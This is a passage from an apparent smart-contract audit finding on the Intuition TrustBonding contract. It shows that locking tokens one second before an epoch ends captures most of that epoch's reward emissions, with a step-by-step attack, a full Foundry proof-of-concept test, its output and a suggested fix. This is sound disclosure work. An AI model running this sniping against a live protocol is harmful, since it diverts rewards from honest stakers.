  "body": "## Finding description and impact\n\nTwo independent design decisions compound into a single exploitable condition, such as below -\n\nMechanic A :  Epoch-End Point-in-Time Snapshot [Line 212](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L212)\n```js\nreturn _balanceOf(account, _epochTimestampEnd(epoch));  // <-- SNAPSHOT AT EPOCH END\n```\nReward share is calculated from veTRUST balance at the single final timestamp of an epoch. A lock created one second before the epoch ends produces a balance of `lockAmount × (unlockTime − epochEnd) / MAXTIME ≈ 99.999%` of full weight.\n\n The attacker contributed for `1 / 1_209_600 = 0.000083%` of the epoch duration, yet their full stake registers in the reward snapshot.\n\nMechanic B : Duration-blind utilization ratio [Line 513–518](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L513-L518)\n\n```js\n        int256 rawUtilizationDelta = userUtilizationAfter - userUtilizationBefore;\n\n        // If the utilizationDelta is negative or zero, we return the minimum personal utilization ratio\n        if (rawUtilizationDelta <= 0) {\n            return personalUtilizationLowerBound;   // <-- FLOOR RETURNED HERE (3,000 bp)\n        }\n```\nWe can see that the personal utilization ratio is computed exclusively from MultiVault activity deltas between epochs. Lock duration within an epoch has zero weight in the ratio formula.\n\nPersonal utilization ratio is computed exclusively from MultiVault activity deltas between consecutive epochs. Lock duration within an epoch has no representation in the formula. A user with zero MultiVault activity receives `personalUtilizationLowerBound` unconditionally, whether they locked for 1 second or 14 days. The contract cannot distinguish between the two at this decision point, so no duration-based penalty is ever applied to the late joiner.\n\nAttack execution flow as below step by step -\n\nPrerequisites: \n - Epoch length: 1,209,600 seconds (14 days)\n - `personalUtilizationLowerBound`: 3,000 bp (30%)\n - Attacker has zero position through epochs 0 to N-1\n\n1.  Attacker maintains zero position (Epochs 0 to N-1)\n```js\n// Attacker does not lock tokens, has no MultiVault activity\n// Result: _userEligibleRewardsForEpoch(attacker, N-1) = 0\n```\n\n2. Last-second lock creation (Epoch N, Final Second)\n```js\nuint256 epochNEnd = trustBonding.epochTimestampEnd(N);\nvm.warp(epochNEnd - 1);  // 1 second before epoch end\n\n// Attacker creates lock\ntrustBonding.create_lock(10_000 ether, block.timestamp + 104 weeks);\n```\nResult: Lock is included in epoch N end snapshot with ~99.999% of theoretical full weight.\n\n3. Epoch N Ends; Snapshot Recorded\n```js\nvm.warp(epochNEnd + 1);  // Advance to epoch N+1\n\n// Snapshot values captured:\n// - attackerBalEpochN = ~9,972e18 veTRUST\n// - totalBalEpochN = ~10,912e18 veTRUST (attacker holds ~91.4%)\n```\n\n4. Attacker claims rewards for Epoch N (During Epoch N+1)\n```js\n// claimRewards() computes:\nuint256 rawUserRewards = _userEligibleRewardsForEpoch(attacker, N);\n// = attackerBal × emissionsForEpoch(N) / totalBal\n// ≈ 90.9% of epoch emissions\n\nuint256 personalUtilizationRatio = _getPersonalUtilizationRatio(attacker, N);\n// rawUtilizationDelta = 0 (no MultiVault activity)\n// --> returns personalUtilizationLowerBound = 3,000 bp\n\nuint256 finalRewards = rawUserRewards × 3,000 / 10,000;\n// ≈ 27.3% of total epoch emissions claimed by attacker\n\n```\n\n5. Permanent dilution of honest participants\n```js\n// Honest participant Alice (locked full epoch, 1,000 ether):\nuint256 aliceRaw = 1,000e18 × emissions / 10,912e18 ≈ 9.1% of emissions\nuint256 aliceFinal = aliceRaw × 3,000 / 10,000 ≈ 2.7% of emissions\n\n// Counterfactual (no attacker):\nuint256 aliceSolo = emissions × 3,000 / 10,000 = 30% of emissions\n\n// Dilution: (30% - 2.7%) / 30% = 91% of Alice's potential rewards lost\n```\n\n## Impact\nAny actor can lock a large stake in the final block of any epoch and receive proportional rewards for that epoch with zero prior participation and zero protocol activity requirement. The attack is costless beyond the lock deposit itself (which is returned at unlock), repeatable every epoch and scales linearly with stake size. Every honest participant in a sniped epoch has their rewards diluted proportionally to the attacker's injected balance.\n\n\n\n\n## Recommended mitigation steps\n\nReplace the point-in-time snapshot with a time-weighted average balance across the epoch as below -\n```js\n// Use average of epoch-start and epoch-end balance\nuint256 balStart = _balanceOf(account, _epochTimestampEnd(epoch - 1));\nuint256 balEnd   = _balanceOf(account, _epochTimestampEnd(epoch));\nreturn (balStart + balEnd) / 2;\n```\nA lock created at the last second produces `balStart = 0`, halving the effective balance and making late-epoch sniping unprofitable relative to full-epoch participation.",
  "proof_of_concept": "To demonstrate the issue we've developed and added the below test into our existing POC template as `tests/PoCCore.t.sol`\n\n\n```js\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { console2 } from \"forge-std/src/console2.sol\";\nimport { BaseTest } from \"./BaseTest.t.sol\";\n\n\n//   COMBINED EFFECT:\n//     A late joiner with zero MultiVault activity gets:\n//       - identical ratio to a full-epoch participant with zero MultiVault activity\n//       - near-full veTRUST balance at the snapshot\n//     Result: rewards scale purely with stake magnitude, making participation\n//     duration economically irrelevant.\n//\n// Four elements proven in sequence:\n//   E-1  1-second lock IS included in epoch-end snapshot at near-full weight\n//   E-2  Bob receives IDENTICAL ratio to Alice despite 0.000083% participation\n//   E-3  Bob successfully claims substantial rewards at floor ratio\n//   E-4  Alice's rewards are quantifiably and materially diluted\n//\n// Timeline:\n//   Epoch 0  [ts 1 .. epochEnd0]        Alice locks 1_000 WTRUST (full participation)\n//   Epoch 1  [epochEnd0+1 .. epochEnd1]  Bob has no lock, no MultiVault activity\n//   Epoch 2  [epochEnd1+1 .. epochEnd2]  Bob locks 10_000 WTRUST at last second\n//   Epoch 3  [epochEnd2+1 ..]            Both claim epoch 2 rewards\n//\n// NOTE: epoch 2 is deliberately chosen as the claim target. Epochs 0 and 1\n// unconditionally return BASIS_POINTS_DIVISOR via the fast-path at L505\n// (_epoch < 2). To reach the utilization-ratio logic that governs E-2, the\n// claimed epoch must be >= 2. Epoch 3 is required as the claiming epoch so\n// that the guard `epoch > currentEpochLocal - 2` does not truncate the query.\n\n\ncontract PoCCore is BaseTest {\n\n    function test_submissionValidity() external {\n\n     \n        // Epoch geometry — derived entirely from the live controller\n\n        uint256 epochLen  = protocol.trustBonding.epochLength();   // 1_209_600 s (14 days)\n        uint256 startTs   = block.timestamp;                        // 1 (Forge default)\n\n        uint256 epochEnd2 = protocol.trustBonding.epochTimestampEnd(2);\n\n        console2.log(\"=== PoC: Last-Second Lock Sniping ===\");\n        console2.log(\"epochLen              :\", epochLen);\n        console2.log(\"startTs               :\", startTs);\n        console2.log(\"epochEnd(2)           :\", epochEnd2);\n\n       \n        // Honest participant — Alice locks at epoch 0 start\n        // Full participation across epochs 0, 1, and 2.\n       \n\n        uint256 aliceLock   = 1_000 ether;\n        uint256 aliceUnlock = startTs + 104 weeks;   // 728 days < MAXTIME (730 days)\n\n        resetPrank(users.alice);\n        protocol.trustBonding.create_lock(aliceLock, aliceUnlock);\n\n        assertEq(protocol.trustBonding.currentEpoch(), 0, \"setup: must be epoch 0 at Alice lock\");\n        console2.log(\"[Epoch 0] Alice locked:\", aliceLock / 1e18, \"WTRUST for 104 weeks\");\n\n        {\n            uint256 aliceBalEpoch0 = protocol.trustBonding.userBondedBalanceAtEpochEnd(users.alice, 0);\n            assertGt(aliceBalEpoch0, 0, \"setup: Alice must have veTRUST at epochEnd(0)\");\n        }\n\n        // Attacker — Bob locks ONE second before epoch 2 ends\n        //\n        // (epochEnd2 - 1) is the final second that belongs to epoch 2.\n        // Bob's lock exists for exactly 1 second before the epoch snapshot\n        // is taken. He has zero MultiVault activity in epochs 1 or 2.\n      \n\n        uint256 attackerLockTs = epochEnd2 - 1;\n        vm.warp(attackerLockTs);\n\n        assertEq(\n            protocol.trustBonding.currentEpoch(), 2,\n            \"setup: must still be epoch 2 one second before epochEnd2\"\n        );\n        console2.log(\"[Epoch 2, ts =\", attackerLockTs, \"] Bob locks (1 second before epoch end)\");\n\n        uint256 attackerLock   = 10_000 ether;                    // 10× Alice's stake\n        uint256 attackerUnlock = attackerLockTs + 104 weeks;\n\n        resetPrank(users.bob);\n        protocol.trustBonding.create_lock(attackerLock, attackerUnlock);\n\n        // Advance one second into epoch 3\n        vm.warp(epochEnd2 + 1);\n        assertEq(protocol.trustBonding.currentEpoch(), 3, \"setup: must be epoch 3 after warp\");\n\n        // E-1: 1-second lock IS included in epoch-end snapshot at near-full weight\n       \n        // userBondedBalanceAtEpochEnd(bob, 2) calls [L212]:\n        //   _balanceOf(bob, _epochTimestampEnd(2))\n        //\n        // VotingEscrow balance at t = epochEnd2 (1 second after lock):\n        //   balance = lockAmount × (unlockTime − epochEnd2) / MAXTIME\n        //           ≈ 10_000e18 × (104w − 1s) / 104w\n        //           ≈ 99.999% of 10_000e18\n        //\n        // Bob participated for 1 second out of 1_209_600 seconds.\n        // Participation fraction = 0.000083%.\n        // His full staked weight still appears in the reward calculation.\n        \n\n        uint256 attackerBalEpoch2 = protocol.trustBonding.userBondedBalanceAtEpochEnd(users.bob,   2);\n        uint256 aliceBalEpoch2    = protocol.trustBonding.userBondedBalanceAtEpochEnd(users.alice, 2);\n        uint256 totalBalEpoch2    = protocol.trustBonding.totalBondedBalanceAtEpochEnd(2);\n\n        // E-1a: Bob has non-zero balance at epochEnd(2) from his 1-second lock\n        assertGt(\n            attackerBalEpoch2, 0,\n            \"E-1 FAIL: attacker veTRUST at epochEnd(2) must be > 0 despite 1-second lock\"\n        );\n\n        // E-1b: Bob's balance is >= 99% of the proportional full-epoch balance\n        //        (10x lock → compare against 10x Alice's balance at epochEnd(2))\n        assertGe(\n            attackerBalEpoch2,\n            (aliceBalEpoch2 * 10 * 99) / 100,\n            \"E-1 FAIL: 1-second balance must be >=99% of proportional full-epoch balance\"\n        );\n\n        // E-1c: Bob holds the dominant fraction of the total pool\n        //        With 10_000e18 vs 1_000e18, Bob's share ≈ 90.9% of totalBalance\n        assertGt(\n            attackerBalEpoch2,\n            totalBalEpoch2 / 2,\n            \"E-1 FAIL: attacker must hold majority of pool despite 1-second participation\"\n        );\n\n        uint256 lockDuration = epochEnd2 - attackerLockTs; // = 1 second\n        console2.log(\"\");\n        console2.log(\"--- E-1: Last-second lock in epoch-end snapshot ---\");\n        console2.log(\"Bob lock duration in epoch 2 (s)      :\", lockDuration);\n        console2.log(\"Full epoch duration (s)               :\", epochLen);\n        console2.log(\"Bob participation fraction (1e18=100%):\", (lockDuration * 1e18) / epochLen);\n        console2.log(\"Bob   veTRUST at epochEnd(2)          :\", attackerBalEpoch2);\n        console2.log(\"Alice veTRUST at epochEnd(2)          :\", aliceBalEpoch2);\n        console2.log(\"Total veTRUST at epochEnd(2)          :\", totalBalEpoch2);\n\n      \n        // E-2: Bob receives IDENTICAL ratio to Alice despite 0.000083% duration\n\n        // _getPersonalUtilizationRatio(bob, epoch=2) control flow:\n        //\n        //   L505: epoch 2 >= 2  →  NOT caught by fast-path\n        //   L509: getUserUtilizationInEpoch(bob, 1) = 0  (no epoch 1 activity)\n        //   L510: getUserUtilizationInEpoch(bob, 2) = 0  (1-second lock, no vault activity)\n        //   L513: rawUtilizationDelta = 0 - 0 = 0\n        //   L516: rawUtilizationDelta <= 0  →  TRUE\n        //   L517: return personalUtilizationLowerBound       ← FLOOR RETURNED HERE\n        //\n        // The exemption check at L526-529 is NEVER reached because the delta\n        // guard at L516 fires first. The ratio formula has no epoch-duration\n        // component whatsoever — it is computed solely from MultiVault activity\n        // deltas. Bob's 1-second lock produces the exact same ratio result as\n        // Alice's 14-day lock when both have zero MultiVault utilization change.\n        //\n        // _getPersonalUtilizationRatio(alice, epoch=2) control flow:\n        //   L509: getUserUtilizationInEpoch(alice, 1) = 0\n        //   L510: getUserUtilizationInEpoch(alice, 2) = 0\n        //   L513: rawUtilizationDelta = 0\n        //   L516: rawUtilizationDelta <= 0  →  TRUE\n        //   L517: return personalUtilizationLowerBound       ← SAME RESULT\n        //\n        // Both receive floor ratio. The protocol cannot distinguish between\n        // 1 second of lock and 14 days of lock at this decision point.\n        \n\n        uint256 bobRatio   = protocol.trustBonding.getPersonalUtilizationRatio(users.bob,   2);\n        uint256 aliceRatio = protocol.trustBonding.getPersonalUtilizationRatio(users.alice, 2);\n\n        // E-2a: Bob receives the floor ratio (not zero, not penalised more)\n        assertEq(\n            bobRatio, TRUST_BONDING_PERSONAL_UTILIZATION_LOWER_BOUND,\n            \"E-2 FAIL: Bob must receive floor ratio (3_000 bp)\"\n        );\n\n        // E-2b: Alice also receives the floor ratio\n        assertEq(\n            aliceRatio, TRUST_BONDING_PERSONAL_UTILIZATION_LOWER_BOUND,\n            \"E-2 FAIL: Alice must also receive floor ratio (3_000 bp)\"\n        );\n\n        // E-2c: THE CRITICAL EQUALITY — both ratios are identical despite\n        //        Bob having 0.000083% participation duration vs Alice's 100%.\n        //        The protocol applies zero duration-based penalty to Bob.\n        assertEq(\n            bobRatio, aliceRatio,\n            \"E-2 FAIL: Bob and Alice must receive identical ratios despite radically different participation durations\"\n        );\n\n        console2.log(\"\");\n        console2.log(\"--- E-2: Duration-blind utilization ratio ---\");\n        console2.log(\"Bob   personal util ratio (bp)         :\", bobRatio);\n        console2.log(\"Alice personal util ratio (bp)         :\", aliceRatio);\n        console2.log(\"Ratios equal despite 0.000083% vs 100% :\", bobRatio == aliceRatio);\n        console2.log(\"Bob MultiVault util epoch 1            : 0 (no activity)\");\n        console2.log(\"Bob MultiVault util epoch 2            : 0 (1-second lock only)\");\n        console2.log(\"Delta <= 0  ->  floor returned at L517 (exemption never reached)\");\n\n        // E-3: Bob successfully claims substantial rewards at floor ratio\n        \n        // claimRewards() computes [L371]:\n        //   userRewards = rawUserRewards × personalUtilizationRatio / 10_000\n        //\n        // Bob: rawUserRewards ≈ 10_000/(10_000+1_000) × emissions ≈ 90.9% of emissions\n        //      ratio = 3_000 (30%)\n        //      final = 90.9% × 30% = 27.3% of total epoch emissions\n        //\n        // Alice: rawUserRewards ≈ 1_000/11_000 × emissions ≈ 9.1% of emissions\n        //        ratio = 3_000 (30%)\n        //        final = 9.1% × 30% = 2.7% of total epoch emissions\n        //\n        // Bob earns 10× Alice despite holding his lock for 1 second.\n    \n\n        vm.mockCall(\n            address(protocol.satelliteEmissionsController),\n            abi.encodeWithSignature(\"transfer(address,uint256)\"),\n            abi.encode()\n        );\n\n        resetPrank(users.bob);\n        protocol.trustBonding.claimRewards(users.bob);\n\n        vm.clearMockedCalls();\n\n        // Read the value the contract actually wrote to storage\n        uint256 bobFinal = protocol.trustBonding.userClaimedRewardsForEpoch(users.bob, 2);\n        uint256 bobRaw   = protocol.trustBonding.userEligibleRewardsForEpoch(users.bob, 2);\n\n        // E-3a: Bob successfully claimed non-zero rewards\n        assertGt(\n            bobFinal, 0,\n            \"E-3 FAIL: Bob must have non-zero claimed rewards\"\n        );\n\n        // E-3b: final == rawRewards × ratio / 10_000 (formula applied correctly)\n        assertEq(\n            bobFinal, (bobRaw * bobRatio) / BASIS_POINTS_DIVISOR,\n            \"E-3 FAIL: Bob final rewards must equal rawRewards x ratio / 10_000\"\n        );\n\n        console2.log(\"\");\n        console2.log(\"--- E-3: Bob claims substantial rewards at floor ratio ---\");\n        console2.log(\"Bob raw eligible rewards (epoch 2)      :\", bobRaw);\n        console2.log(\"Bob ratio (bp)                          :\", bobRatio);\n        console2.log(\"Bob final claimed rewards               :\", bobFinal);\n\n       \n        // E-4: Alice's rewards are quantifiably and materially diluted\n        \n        // Counterfactual (Alice is sole participant, no attacker):\n        //   aliceRawSolo    = emissionsForEpoch(2)   (100% of pool)\n        //   aliceFinalSolo  = aliceRawSolo × 3_000 / 10_000\n        //\n        // Actual (with Bob holding ~90.9% of pool):\n        //   aliceRawDiluted  = emissionsForEpoch(2) × aliceBal / totalBal\n        //   aliceFinalActual = aliceRawDiluted × 3_000 / 10_000\n        //\n        // absoluteDilution = aliceFinalSolo − aliceFinalActual\n        // dilutionBp       = absoluteDilution / aliceFinalSolo × 10_000\n        //\n        // emissionsForEpoch(2) uses the actual protocol-computed value\n        // (system utilization ratio applied for epoch >= 2 at L465-466).\n       \n        uint256 epochEmissions   = protocol.trustBonding.emissionsForEpoch(2);\n        uint256 aliceRawDiluted  = protocol.trustBonding.userEligibleRewardsForEpoch(users.alice, 2);\n        uint256 aliceRawSolo     = epochEmissions;   // sole participant → 100% of pool\n\n        uint256 aliceFinalActual = (aliceRawDiluted * aliceRatio) / BASIS_POINTS_DIVISOR;\n        uint256 aliceFinalSolo   = (aliceRawSolo    * aliceRatio) / BASIS_POINTS_DIVISOR;\n\n        uint256 absoluteDilution = aliceFinalSolo > aliceFinalActual\n            ? aliceFinalSolo - aliceFinalActual : 0;\n        uint256 dilutionBp       = aliceFinalSolo > 0\n            ? (absoluteDilution * BASIS_POINTS_DIVISOR) / aliceFinalSolo : 0;\n\n        // E-4a: Alice's raw rewards are strictly less than total emissions\n        assertLt(\n            aliceRawDiluted, epochEmissions,\n            \"E-4 FAIL: Alice raw rewards must be < total emissions (dilution present)\"\n        );\n\n        // E-4b: Bob's final rewards exceed Alice's final rewards\n        //        10× stake × same ratio = 10× rewards\n        assertGt(\n            bobFinal, aliceFinalActual,\n            \"E-4 FAIL: Bob (1-second lock) must earn more than Alice (full-epoch lock)\"\n        );\n\n        // E-4c: Alice loses more than 80% of her counterfactual solo rewards\n        //        Bob holds ~90.9% of pool → Alice retains ~9.1% → dilution ≈ 9090 bp\n        assertGt(\n            dilutionBp, 8000,\n            \"E-4 FAIL: dilution must exceed 80% of Alice's counterfactual solo rewards\"\n        );\n\n        console2.log(\"\");\n        console2.log(\"--- E-4: Dilution impact on honest participant ---\");\n        console2.log(\"Total emissions epoch 2                 :\", epochEmissions);\n        console2.log(\"Alice raw (solo, no Bob)                :\", aliceRawSolo);\n        console2.log(\"Alice raw (diluted, with Bob)           :\", aliceRawDiluted);\n        console2.log(\"Alice final (30% ratio, solo)           :\", aliceFinalSolo);\n        console2.log(\"Alice final (30% ratio, diluted)        :\", aliceFinalActual);\n        console2.log(\"Bob   final (30% ratio, 10x stake)      :\", bobFinal);\n        console2.log(\"Absolute token loss to Alice            :\", absoluteDilution);\n        console2.log(\"Dilution fraction of solo (bp / 10_000) :\", dilutionBp);\n        console2.log(\"\");\n        console2.log(\"=== CONFIRMED: all 4 PoC elements passed ===\");\n        console2.log(\"  E-1: 1-second lock at >=99% weight in epoch-end snapshot   [PASS]\");\n        console2.log(\"  E-2: Bob ratio == Alice ratio (floor) - no duration penalty [PASS]\");\n        console2.log(\"  E-3: Bob claims 10x Alice rewards despite 1-second lock     [PASS]\");\n        console2.log(\"  E-4: Alice diluted >80% of her solo counterfactual          [PASS]\");\n    }\n}\n```\n\nPlease run this test using the forge command : \n```js\n forge test --match-path tests/PoCCore.t.sol --match-test submissionValidity -vvv\n```\n\nDetails output:\n```js\nRan 1 test for tests/PoCCore.t.sol:PoCCore\n[PASS] test_submissionValidity() (gas: 1264837)\nLogs:\n  MultiVault implementation address:  0xF62849F9A0B5Bf2913b396098F7c7019b51A820a\n  MultiVault proxy address:  0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9\n  AtomWallet implementation deployed at: 0xc7183455a4C133Ae270771860664b6B7ec320bB1\n  AtomWalletBeacon deployed at: 0xa0Cb889707d426A7A386870A03bc70d1b0697598\n  AtomWalletFactory implementation address:  0x1d1499e622D69689cdf9004d05Ec547d650Ff211\n  AtomWalletFactory proxy address:  0xA4AD4f68d0b91CFD19687c881e50f3A00242828c\n  WrappedTrust address:  0x03A6a84cD762D9707A21605b548aaaB891562aAb\n  TrustBonding implementation address:  0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF\n  TrustBonding proxy address:  0x15cF58144EF33af1e14b5208015d11F9143E27b9\n  SatelliteEmissionsController Implementation 0x212224D2F2d262cd093eE13240ca4873fcCBbA3C\n  SatelliteEmissionsController Proxy 0x2a07706473244BC757E10F2a9E86fB532828afe3\n  BondingCurveRegistry address:  0xD16d567549A2a2a2005aEACf7fB193851603dd70\n  LinearCurve address:  0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f\n  OffsetProgressiveCurve address:  0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6\n  ProgressiveCurve address:  0x756e0562323ADcDA4430d6cb456d9151f605290B\n  Added LinearCurve to registry with ID: 1\n  Added OffsetProgressiveCurve to registry with ID: 2\n  Added ProgressiveCurve to registry with ID: 3\n  === PoC: Last-Second Lock Sniping ===\n  epochLen              : 1209600\n  startTs               : 1\n  epochEnd(2)           : 3628801\n  [Epoch 0] Alice locked: 1000 WTRUST for 104 weeks\n  [Epoch 2, ts = 3628800 ] Bob locks (1 second before epoch end)\n  \n  --- E-1: Last-second lock in epoch-end snapshot ---\n  Bob lock duration in epoch 2 (s)      : 1\n  Full epoch duration (s)               : 1209600\n  Bob participation fraction (1e18=100%): 826719576719\n  Bob   veTRUST at epochEnd(2)          : 9972602581177008823578\n  Alice veTRUST at epochEnd(2)          : 939726011542346900918\n  Total veTRUST at epochEnd(2)          : 10912328592719355724496\n  \n  --- E-2: Duration-blind utilization ratio ---\n  Bob   personal util ratio (bp)         : 3000\n  Alice personal util ratio (bp)         : 3000\n  Ratios equal despite 0.000083% vs 100% : true\n  Bob MultiVault util epoch 1            : 0 (no activity)\n  Bob MultiVault util epoch 2            : 0 (1-second lock only)\n  Delta <= 0  ->  floor returned at L517 (exemption never reached)\n  \n  --- E-3: Bob claims substantial rewards at floor ratio ---\n  Bob raw eligible rewards (epoch 2)      : 456942003553241293906\n  Bob ratio (bp)                          : 3000\n  Bob final claimed rewards               : 137082601065972388171\n  \n  --- E-4: Dilution impact on honest participant ---\n  Total emissions epoch 2                 : 500000000000000000000\n  Alice raw (solo, no Bob)                : 500000000000000000000\n  Alice raw (diluted, with Bob)           : 43057996446758706093\n  Alice final (30% ratio, solo)           : 150000000000000000000\n  Alice final (30% ratio, diluted)        : 12917398934027611827\n  Bob   final (30% ratio, 10x stake)      : 137082601065972388171\n  Absolute token loss to Alice            : 137082601065972388173\n  Dilution fraction of solo (bp / 10_000) : 9138\n  \n  === CONFIRMED: all 4 PoC elements passed ===\n    E-1: 1-second lock at >=99% weight in epoch-end snapshot   [PASS]\n    E-2: Bob ratio == Alice ratio (floor) - no duration penalty [PASS]\n    E-3: Bob claims 10x Alice rewards despite 1-second lock     [PASS]\n    E-4: Alice diluted >80% of her solo counterfactual          [PASS]\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.40ms (2.12ms CPU time)\n\nRan 1 test suite in 24.17ms (16.40ms CPU tim